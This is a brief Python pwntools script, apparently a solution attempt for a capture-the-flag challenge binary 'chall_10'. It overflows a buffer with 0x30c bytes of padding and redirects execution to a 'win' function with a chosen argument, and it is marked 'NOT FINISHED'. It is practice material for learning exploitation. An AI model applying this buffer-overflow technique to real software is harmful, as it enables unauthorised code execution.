from pwn import *
binary = context.binary = ELF('./chall_10')
p = process(binary.path)

p.sendline(b'' + (0x308 + 0x4)*b'A' + p32(binary.sym.win) + p32(0) + p32(0x1a55fac3))
p.interactive()
# NOT FINISHED
